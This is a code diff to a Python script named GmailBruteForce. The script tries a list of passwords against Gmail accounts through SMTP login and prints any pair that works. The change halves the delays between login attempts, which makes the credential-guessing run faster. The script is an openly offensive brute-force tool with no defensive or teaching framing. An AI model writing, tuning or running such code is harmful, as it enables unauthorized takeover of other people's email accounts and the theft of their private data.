@@ -32,13 +32,13 @@ class GmailBruteForce():
             for password in self.passwords:
                 try:
                     self.smtp.login(user,password)
-                    sleep(2)
+                    sleep(1)
                     print(("\033[1;37mgood -> %s " % user + " -> %s \033[1;m" % password ))
                     self.smtp.quit()
                     self.init_smtplib()
                     break;
                 except:
-                    sleep(2)
+                    sleep(1)
                     # print("\033[1;31msorry \033[1;m")
                     print(("\033[1;31msorry %s <- " % user + " -> %s \033[1;m" % password ))
 
@@ -69,7 +69,7 @@ if do == '1':
     headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 
     instance.try_gmail()
-    sleep(2)
+    sleep(1)
    
 ############
 if do == '2':
@@ -81,4 +81,4 @@ if do == '2':
     instance.get_pass_list(senha)
 
     instance.try_gmail()
-    sleep(2)
+    sleep(1)
